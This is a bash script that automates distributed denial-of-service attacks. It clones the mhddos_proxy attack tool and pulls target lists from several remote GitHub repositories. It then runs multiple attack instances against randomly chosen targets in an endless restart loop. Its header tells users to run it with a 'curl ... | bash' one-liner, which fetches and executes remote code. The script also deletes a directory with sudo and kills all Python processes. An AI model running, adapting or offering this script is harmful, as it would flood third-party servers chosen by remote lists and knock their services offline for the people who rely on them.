#!/bin/bash
##### Use next command in local linux terminal to run this script.
#  >>>>>   curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash  <<<<<
##### It is possible to pass arguments "num_of_copies" and "restart_interval" to script.
##### curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash -s -- 2 1800 (launch with num_of_copies=2 and restart_interval=1800)

##### To kill script just close terminal window. OR. In other terminal run 'pkill -f python3'. And press CTRL+C in main window.

## "num_of_copies" allows to start several copies of runner.py.
## Each copy will choose different target from https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets
## This is different from "multiple targets" in mhddos_proxy. Built in mhddos_proxy "multiple targets" can attack multiple IP's but only with same one method.
## "num_of_copies" allows to launch several copies of runner.py and targets will be attacked with different methods.
## Default = 1 copies(instances). Don't use high values without testing first, pc/vps can slowdown.
num_of_copies="${1:-1}"

## Restart script every N seconds (900s = 15m, 1800s = 30m, 3600s = 60m).
## It allows to download updates for mhddos_proxy, MHDDoS and target list.
## By default 900s (15m), can be passed as second parameter
restart_interval="300"

#parameters that passed to python scrypt
threads="${2:-1000}"
threads="-t $threads"
rpc="${3:-2000}"
rpc="--rpc $rpc"
proxy_interval="1200"
proxy_interval="-p $proxy_interval"

#Just in case kill previous copy of mhddos_proxy
taskkill -f -im python.exe
taskkill -f -im python3.8.exe
taskkill -f -im python3.9.exe
taskkill -f -im python3.10.exe
cd ~
sudo rm -r mhddos_proxy
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git

# Restart attacks and update targets list every 15 minutes (by default)
while true
echo -e "VERSION 02052022\n"
do
   
   random_url="$(shuf -i 1-3 -n1)"
   echo -e "$random_url\n"
   if ((random_url == 1));
   then
         ##my
         echo -e "My list\n"
         get_url=https://raw.githubusercontent.com/Maxssaf/target/main/runner_targets
   elif ((random_url == 2));
   then
         ##zhnec
         echo -e "ZHNEC_uato_mhddos\n"
         get_url=https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets
   elif ((random_url == 3));
   then
         ##ddossepariv_
         echo -e "DDOS_separiv_alexnest-ua\n"
         get_url=https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux
   fi
   
   ##get_url=https://raw.githubusercontent.com/Maxssaf/target/main/runner_targets
   # Get number of targets in runner_targets. Only strings that are not commented out are used. Everything else is omitted.
   list_size=$(curl -s $get_url | cat | grep "^[^#]" | wc -l)

   echo -e "\nNumber of targets in list: " $list_size "\n"

   # Create list with random numbers. To choose random targets from list on next step.
   random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
   echo -e "random number(s): " $random_numbers "\n"

   # Print all randomly selected targets on screen
   echo -e "Choosen target(s): "

   # Launch multiple mhddos_proxy instances with different targets.
   for i in $random_numbers
   do
            # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s $get_url | cat | grep "^[^#]")")
            echo -e " "$cmd_line"\n"
            #echo $cmd_line
            #echo $cmd_line $proxy_interval $threads $rpc
            cd ~/mhddos_proxy
            python runner.py $cmd_line $proxy_interval $rpc&    ##$threads
            echo -e "Attack started. Wait a few minutes for output"
   done
echo -e "\nDDoS is up and Running, next update of targets list in $restart_interval\nSleeping\n"
sleep $restart_interval
clear
 echo -e "\nRESTARTING\nKilling old processes..."
 taskkill -f -im python.exe
 taskkill -f -im python3.8.exe
 taskkill -f -im python3.9.exe
 taskkill -f -im python3.10.exe
 echo -e "\nOld processes have been killed - starting new ones"
done
